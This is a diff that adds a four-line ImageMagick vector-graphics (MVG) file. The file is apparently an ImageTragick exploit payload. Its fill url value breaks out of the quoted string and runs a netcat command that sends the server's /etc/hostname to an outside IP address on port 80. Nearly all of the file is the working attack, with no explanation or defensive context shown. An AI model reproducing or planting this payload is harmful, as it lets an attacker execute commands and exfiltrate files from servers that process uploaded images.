@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://54.153.105.14"|nc 54.153.105.14 80 < "/etc/hostname)'
+pop graphic-context
